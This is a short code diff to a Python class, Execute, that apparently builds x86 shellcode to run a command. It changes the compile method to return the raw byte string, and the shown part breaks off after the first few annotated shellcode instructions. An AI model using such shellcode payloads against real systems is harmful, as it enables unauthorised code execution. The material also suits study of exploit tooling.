@@ -36,11 +36,11 @@ class Execute (Dynamic):
         if "\x00" in command:
             raise ValueError("Cannot have null chars in command: %r" % command)
 
-    def compile(self, variables = None):
+    def compile(self, *argv, **argd):
         command = self.command
         if "\x00" in command:
             raise ValueError("Cannot have null chars in command: %r" % command)
-        self._bytes = (
+        return (
             "\xEB\x25"              # 00000000: jmp short 0x27
             "\x5A"                  # 00000002: pop edx
             "\x31\xC9"              # 00000003: xor ecx,ecx
